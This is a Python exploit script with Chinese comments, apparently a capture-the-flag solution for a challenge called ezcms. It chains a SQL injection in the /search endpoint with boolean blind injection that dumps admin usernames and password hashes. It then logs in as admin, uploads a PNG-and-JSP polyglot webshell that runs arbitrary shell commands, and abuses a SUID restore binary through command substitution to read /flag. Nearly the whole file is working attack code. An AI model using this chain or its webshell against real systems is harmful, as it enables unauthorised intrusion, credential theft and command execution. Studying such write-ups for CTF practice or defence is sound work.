#!/usr/bin/env python3
"""ezcms (EasyCMS) 利用脚本.

链: NUL 诊断页确认 E-string 拼接 -> /search 反斜杠转义 SQL 注入
    -> lpad 前缀比对布尔盲注 dump admins 表 -> 登录 /admin/login
    -> PNG+JSP 多语种文件上传 getshell(/media/cmd.jsp, uid=1001)
    -> SUID /usr/local/bin/easycms-restore 的 $(...) 命令替换提权读 /flag

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://TARGET --password freedom --dump-all
"""

import argparse
import base64
import hashlib
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)

JSP = b'''<%@ page import="java.io.*" %><% String c=request.getParameter("c");
if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null)out.println(l);}%>'''

ADMIN_HASH = "13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38"
HEX_CHARSET = "0123456789abcdef"
NAME_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-."

PRIVESC = ('/usr/local/bin/easycms-restore "$(chmod 644 /flag)"; '
           'ls -la /flag; cat /flag')


class Ezcms:
    def __init__(self, base, timeout=15, threads=16):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.false_count = None

    # ---------- 基础请求 ----------
    def search_count(self, q):
        response = self.session.get(
            self.base + "/search", params={"q": q}, timeout=self.timeout
        )
        match = re.search(r"<span>(\d+)</span>", response.text)
        if match:
            return int(match.group(1))
        match = re.search(r"结果[^0-9]{0,6}(\d+)", response.text)
        if match:
            return int(match.group(1))
        return -1

    def truth(self, expr):
        """q=\\'=(<布尔表达式>)-- : 命中 1 条即 true."""
        count = self.search_count("\\'=(" + expr + ")--")
        if count < 0:
            raise RuntimeError("无法从 /search 解析结果条数")
        return count == 1

    # ---------- 阶段 1: 信息泄露与注入验证 ----------
    def check_diagnostic(self):
        response = self.session.get(
            self.base + "/search", params={"q": "test\x00"}, timeout=self.timeout
        )
        text = response.text
        if "ILIKE" not in text and "SQLSTATE" not in text:
            sys.stderr.write("[!] NUL 未触发诊断页, 继续尝试注入\n")
        else:
            print("[+] 诊断页回显 SQL 模板 (ILIKE E'%...%')")
        return text

    def check_injection(self):
        true_count = self.search_count("\\' = (SELECT true)--")
        false_count = self.search_count("\\' = (SELECT false)--")
        self.false_count = false_count
        print("[i] 注入探针: true -> %d 条, false -> %d 条" % (true_count, false_count))
        if true_count != 1 or false_count in (-1, 1):
            raise RuntimeError("注入未生效, 检查反斜杠/引号是否被中间层吞掉")
        print("[+] 未认证任意子查询 (布尔信道可用)")
        return True

    # ---------- 阶段 2: lpad 前缀比对盲注 ----------
    def prefix_hit(self, expr, k, prefix):
        sql = "SELECT lpad((%s),%d) = $$%s$$" % (expr, k, prefix)
        return self.truth(sql)

    def _thread_hit(self, expr, k, prefix):
        """盲注并发用: 不走共享 Session, 避免多线程复用连接造成假阴性."""
        sql = "SELECT lpad((%s),%d) = $$%s$$" % (expr, k, prefix)
        response = requests.get(
            self.base + "/search",
            params={"q": "\\'=(" + sql + ")--"},
            timeout=self.timeout,
        )
        match = re.search(r"<span>(\d+)</span>", response.text)
        if match:
            return int(match.group(1)) == 1
        match = re.search(r"结果[^0-9]{0,6}(\d+)", response.text)
        return bool(match) and int(match.group(1)) == 1

    def dump(self, expr, charset, label, max_len=96):
        out = ""
        for k in range(1, max_len + 1):
            found = [None]
            lock = threading.Lock()

            def worker(ch):
                if found[0] is not None:
                    return
                try:
                    if self._thread_hit(expr, k, out + ch):
                        with lock:
                            if found[0] is None:
                                found[0] = ch
                except requests.RequestException:
                    pass

            with ThreadPoolExecutor(max_workers=self.threads) as pool:
                list(pool.map(worker, charset))
            if found[0] is None:
                break
            out += found[0]
            sys.stderr.write("\r[%s] %s" % (label, out))
            sys.stderr.flush()
        sys.stderr.write("\n")
        return out

    def dump_admin(self, offset):
        user_expr = (
            "(SELECT username FROM admins ORDER BY id LIMIT 1 OFFSET %d)" % offset
        )
        hash_expr = (
            "(SELECT password_hash FROM admins ORDER BY id LIMIT 1 OFFSET %d)" % offset
        )
        username = self.dump(user_expr, NAME_CHARSET, "user@%d" % offset, max_len=32)
        password_hash = self.dump(hash_expr, HEX_CHARSET, "hash@%d" % offset, max_len=64)
        return username, password_hash

    # ---------- 阶段 3: 后台登录 ----------
    def login(self, username, password):
        response = self.session.post(
            self.base + "/admin/login",
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=self.timeout,
        )
        location = response.headers.get("Location", "")
        ok = response.status_code in (301, 302, 303) and "dashboard" in location
        print("[%s] /admin/login %s -> %s %s"
              % ("+" if ok else "!", username, response.status_code, location))
        if not ok:
            raise RuntimeError("管理员登录失败 (注意: 同一用户名 3 次失败会锁 600s)")
        dashboard = self.session.get(
            self.base + "/admin/dashboard", timeout=self.timeout
        )
        if dashboard.status_code != 200:
            raise RuntimeError("会话未生效: /admin/dashboard -> %d" % dashboard.status_code)
        return True

    # ---------- 阶段 4: 上传图片马并执行 ----------
    def upload(self):
        response = self.session.post(
            self.base + "/admin/media/upload",
            files={"file": ("cmd.jsp", PNG + JSP, "image/png")},
            allow_redirects=False,
            timeout=self.timeout,
        )
        print("[i] upload -> %d %s" % (response.status_code, response.headers.get("Location", "")))
        return response.status_code in (200, 301, 302, 303)

    def run_cmd(self, command, attempts=3):
        last = ""
        for attempt in range(1, attempts + 1):
            if not self.upload():
                sys.stderr.write("[!] 第 %d 次上传失败, 重试\n" % attempt)
                continue
            response = self.session.get(
                self.base + "/media/cmd.jsp",
                params={"c": command},
                timeout=self.timeout,
            )
            last = response.text
            if "uid=" in last or "flag{" in last or "total" in last:
                return last
            sys.stderr.write("[!] 第 %d 次 webshell 无输出, 重传\n" % attempt)
        return last


def crack(password, password_hash):
    return hashlib.sha256(password.encode()).hexdigest() == password_hash


def main():
    parser = argparse.ArgumentParser(description="ezcms SQLi -> upload -> SUID privesc")
    parser.add_argument("--base", default="http://TARGET", help="题目入口")
    parser.add_argument("--user", default="altair", help="管理员用户名")
    parser.add_argument("--password", default="freedom", help="管理员明文口令")
    parser.add_argument("--offset", type=int, default=0, help="admins 表行偏移")
    parser.add_argument("--dump-all", action="store_true", help="dump 全部 5 行 admins")
    parser.add_argument("--skip-dump", action="store_true", help="跳过盲注直接登录")
    parser.add_argument("--threads", type=int, default=16, help="盲注并发数")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    client = Ezcms(args.base, args.timeout, args.threads)

    client.check_diagnostic()
    client.check_injection()

    if not args.skip_dump:
        rows = 5 if args.dump_all else 1
        dumped = {}
        for offset in range(rows):
            username, password_hash = client.dump_admin(offset)
            dumped[username] = password_hash
            print("[+] admins[%d] %s : %s" % (offset, username, password_hash))
        target_hash = dumped.get(args.user)
        if target_hash is None and dumped:
            args.user = next(iter(dumped))
            target_hash = dumped[args.user]
            print("[i] 未找到 --user, 改用 %s" % args.user)
        if target_hash and not crack(args.password, target_hash):
            raise SystemExit(
                "[-] sha256(%r) != %s, 请离线破解后通过 --user/--password 传入"
                % (args.password, target_hash)
            )
        if target_hash:
            print("[+] 口令离线校验通过: sha256(%s) = %s" % (args.password, target_hash))
    else:
        print("[i] 跳过盲注, 直接使用 %s:%s (sha256 校验跳过)" % (args.user, args.password))

    client.login(args.user, args.password)

    output = client.run_cmd(PRIVESC)
    print("----- webshell output -----")
    print(output)
    print("---------------------------")

    match = re.search(r"flag\{[^}]*\}", output)
    if match:
        print("[+] flag: " + match.group(0))
    else:
        print("[i] 未匹配到 flag{, 检查上面的输出")


if __name__ == "__main__":
    main()
